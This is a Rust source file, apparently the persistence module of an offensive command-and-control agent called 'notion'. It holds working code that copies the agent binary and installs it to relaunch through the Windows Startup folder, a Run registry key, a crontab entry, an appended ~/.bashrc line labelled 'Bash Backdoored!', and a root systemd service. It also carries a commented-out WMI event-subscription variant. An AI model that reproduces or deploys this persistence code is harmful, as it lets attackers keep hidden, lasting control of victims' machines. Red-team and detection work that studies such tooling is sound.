use std::error::Error;
use std::env::{var, args};
use is_root::is_root;
#[cfg(not(windows))] use crate::cmd::{shell, save};
#[cfg(not(windows))] use std::fs::{create_dir, copy, write};
#[cfg(windows)] use std::path::Path;
#[cfg(windows)] use winreg::{RegKey};
#[cfg(windows)] use std::fs::copy as fs_copy;
#[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
use crate::config::ConfigOptions;

/// Uses the specified method to establish persistence. 
/// 
/// ### Windows Options
/// 
/// * `startup`: Copies the agent to the Startup Programs folder.
/// * `registry`: Copies the agent to `%LOCALAPPDATA%` and writes a value to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
/// * `wmic`: Establishes persistences via WMI subscriptions.
/// 
/// ### Linux Options
/// 
/// * `cron`: Writes a cronjob to the user's crontab and saves the agent in the home folder
/// * `systemd`: Creates a systemd service and writes the binary someplace special
pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
    // `persist [method] [args]`
    #[cfg(windows)] {
        match s.trim() {
            "startup" => {
                // Get user
                if let Ok(v) = var("APPDATA") {
                    let mut persist_path: String = v;
                    persist_path.push_str(r"\Microsoft\Windows\Start Menu\Programs\Startup\notion.exe");
                    let exe_path = args().nth(0).unwrap();
                    println!("{exe_path}");
                    // let mut out_file = File::create(path).expect("Failed to create file");
                    match fs_copy(&exe_path, &persist_path) {
                        Ok(b)  => { return Ok(format!("{b} bytes written to {persist_path}").to_string());},
                        Err(e) => { return Ok(e.to_string())}
                    }
                } else {
                    return Ok("Couldn't get APPDATA location".to_string());
                };
            },
            "registry" => {
                if let Ok(v) = var("LOCALAPPDATA") {
                    let mut persist_path: String = v;
                    persist_path.push_str(r"\notion.exe");
                    let exe_path = args().nth(0).unwrap();
                    println!("{exe_path}");
                    // let mut out_file = File::create(path).expect("Failed to create file");
                    fs_copy(&exe_path, &persist_path)?;
                    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                    let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
                    let (key, disp) = hkcu.create_subkey(&path)?;
                    match disp {
                        REG_CREATED_NEW_KEY => println!("A new key has been created"),
                        REG_OPENED_EXISTING_KEY => println!("An existing key has been opened"),
                    };
                    key.set_value("Notion", &persist_path)?;
                    Ok("Persistence accomplished".to_string())
                } else {
                    Ok("LOCALDATA undefined".to_string())
                }
            },
            "wmic" => {
                //Ref: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/
                //With special thanks to: https://github.com/trickster0/OffensiveRust
                //OPSEC unsafe! Use with caution
                // under construction
                /*
    
                if let Ok(v) = var("LOCALAPPDATA") {
                let mut persist_path: String = v;
                persist_path.push_str(r"\notion.exe");
                let exe_path = args().nth(0).unwrap();
                println!("{exe_path}");
                // let mut out_file = File::create(path).expect("Failed to create file");
                fs_copy(&exe_path, &persist_path)?;
    
                // I basically hate this, but...
                
                let args1 = r##"/c wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Notion", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"##;
                let args2 = format!(r##"/c wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Notion", ExecutablePath="{persist_path}",CommandLineTemplate="{persist_path}"##);
                let args3 = r##"/c wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Notion\"", Consumer="CommandLineEventConsumer.Name=\"Notion\"""##;
                
                let cmd1 =  { Command::new("cmd")
                        .args([args1])
                        .output()
                        .expect("failed to execute process");
                };
                let cmd2 =  { Command::new("cmd")
                        .args([args2])
                        .output()
                        .expect("failed to execute process");
                };
                let cmd3 =  { Command::new("cmd")
                        .args([args3])
                        .output()
                        .expect("failed to execute process")
                };
                */
                Ok("Under Construction".to_string())
                
            },
            _ => Ok("That's not a persistence method!".to_string())
        }
    }
    #[cfg(not(windows))] {

        let app_path = args().nth(0).unwrap();
        let home = var("HOME")?;
        let app_dir = format!("{home}/.notion");
        let dest_path = format!("{app_dir}/notion");

        match s.trim() {
            "cron"    => {
                // Copy the app to a new folder
                create_dir(&app_dir)?;
                if let Ok(_) = copy(&app_path, dest_path) {
                    // Save config for relaunch
                    save::handle(&format!("{app_dir}/cfg.json"), config_options).await?;
                    // Write a cronjob to the user's crontab with the given minutes as an interval.
                    let cron_string = format!("0 * * * * {app_dir}/notion");
                    if let Ok(_) = shell::handle(&format!("echo '{cron_string}' | crontab - ")).await {
                        Ok("Cronjob added!".to_string())
                    } else {
                        Ok("Could not make cronjob".to_string())
                    }
                } else {
                    Ok("Could not copy app to destination".to_string())
                }
            }
            "bashrc"  => {
                // Copy the app to a new folder
                create_dir(&app_dir)?;
                if let Ok(_) = copy(&app_path, dest_path) {
                    // Save config for relaunch
                    save::handle(&format!("{app_dir}/cfg.json"), config_options).await?;
                    // Write a line to the user's bashrc that starts the agent.
                    if let Ok(_) = shell::handle(&format!("echo '{app_dir}/notion & disown' >> ~/.bashrc ")).await {
                        Ok("Bash Backdoored!".to_string())
                    } else {
                        Ok("Could not modify bashrc".to_string())
                    }
                } else {
                    Ok("Could not copy app to destination".to_string())
                }
            },
            "service" => {
                if is_root() {
                    create_dir(&app_dir)?;    
                    if let Ok(_) = copy(&app_path, &dest_path) {
                        let b64_config = config_options.to_base64();
                        let svc_path = "/lib/systemd/system/notion.service";
                        let svc_string = format!(
"[Unit]
Description=Notion Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart={dest_path} -b {b64_config}

[Install]
WantedBy=multi-user.target"
);
                        write(svc_path, svc_string)?;
                        return shell::handle(&"systemctl enable notion.service".to_string()).await;
                    } else {
                        return Ok("Could not copy service file".to_string());
                    }
                } else {
                    return Ok("Need to be root first. Try enable.".to_string());
                }
            }, 
            _         => Ok("Unknown persistence method!".to_string())
        }
    }
}